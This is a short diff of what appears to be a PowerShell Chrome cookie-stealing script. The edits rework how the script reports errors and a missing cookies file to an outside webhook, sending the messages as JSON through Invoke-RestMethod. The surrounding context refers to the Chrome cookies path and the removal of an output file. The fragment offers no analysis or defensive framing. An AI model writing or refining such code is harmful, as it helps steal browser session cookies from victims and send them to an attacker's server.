@@ -50,13 +50,15 @@ if (Test-Path $chromePath) {
         Remove-Item -Path $outputFile
     }
     catch {
-        # Basic error handling: send an error message to the webhook if something fails
-        $errorMessage = "Error: " + $_.Exception.Message
-        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{content=$errorMessage} -ContentType "application/json"
+        # Send error message to the webhook
+        $errorMessage = "Error: " + $_.ToString()
+        $jsonBody = @{content=$errorMessage} | ConvertTo-Json
+        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
     }
 }
 else {
-    # If the Cookies file is not found, notify via the webhook
+    # If the Cookies file is not found, send a message to the webhook
     $message = "Chrome cookies file not found for user $username"
-    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body @{content=$message} -ContentType "application/json"
+    $jsonBody = @{content=$message} | ConvertTo-Json
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonBody -ContentType "application/json"
 }
